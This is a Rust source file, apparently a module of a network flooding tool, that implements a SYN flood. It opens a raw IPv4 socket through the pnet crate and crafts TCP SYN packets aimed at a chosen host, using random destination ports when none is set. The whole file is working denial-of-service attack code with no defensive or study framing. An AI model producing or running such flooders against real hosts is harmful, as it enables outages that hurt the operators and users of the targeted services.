use std::net::Ipv4Addr;
use std::sync::{Arc, Mutex};

use anyhow::Result;

use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::packet::ipv4::MutableIpv4Packet;
use pnet::packet::tcp::{MutableTcpPacket, TcpFlags};
use pnet::packet::MutablePacket;
use pnet::transport::TransportChannelType::Layer3;
use pnet::transport::{transport_channel, TransportSender};

use pnet::util;
use rand::Rng;

use crate::cli::SynArgs;

use super::{create_ipv4_packet, Flooder};

pub struct SynFlooder {
  tx: Arc<Mutex<TransportSender>>,
  delay: u64,
  args: SynArgs,
}

impl SynFlooder {
  pub fn init(args: SynArgs, delay: u64) -> Result<Self> {
    println!("SYN flood");
    println!("Payloading {}-byte packets", args.size);

    let (tx, _) = transport_channel(2 << 15, Layer3(IpNextHeaderProtocols::Tcp)).unwrap();
    let mut args = args;
    args.src_port = Some(args.src_port.unwrap_or(rand::thread_rng().gen_range(49152..=65535)));
    Ok(Self {
      tx: Arc::new(Mutex::new(tx)),
      delay,
      args,
    })
  }
}

impl Flooder for SynFlooder {
  type Args = SynArgs;
  const PROTO_HEADER_LEN: usize = 20;

  fn clone(&self) -> (Arc<Mutex<TransportSender>>, Ipv4Addr, usize, Self::Args, u64) {
    (
      self.tx.clone(),
      self.args.host,
      self.args.size,
      self.args.clone(),
      self.delay,
    )
  }

  fn create_packet<'a>(buffer_ip: &'a mut [u8], buffer_tcp: &'a mut [u8], args: Self::Args) -> MutableIpv4Packet<'a> {
    let tcp_size = buffer_tcp.len();
    let mut ipv4_packet = create_ipv4_packet(buffer_ip, args.host, IpNextHeaderProtocols::Tcp, tcp_size);

    let mut tcp_packet = MutableTcpPacket::new(buffer_tcp).expect("Error creating tcp packet");
    tcp_packet.set_source(args.src_port.unwrap());
    tcp_packet.set_destination(args.port.unwrap_or(rand::thread_rng().gen_range(1..=65535)));
    tcp_packet.set_sequence(0);
    tcp_packet.set_acknowledgement(0);
    tcp_packet.set_data_offset(5);
    tcp_packet.set_flags(TcpFlags::SYN);
    tcp_packet.set_window(0);
    tcp_packet.set_urgent_ptr(0);
    let checksum = util::checksum(tcp_packet.packet_mut(), 1);
    tcp_packet.set_checksum(checksum);

    ipv4_packet.set_payload(tcp_packet.packet_mut());
    ipv4_packet
  }
}
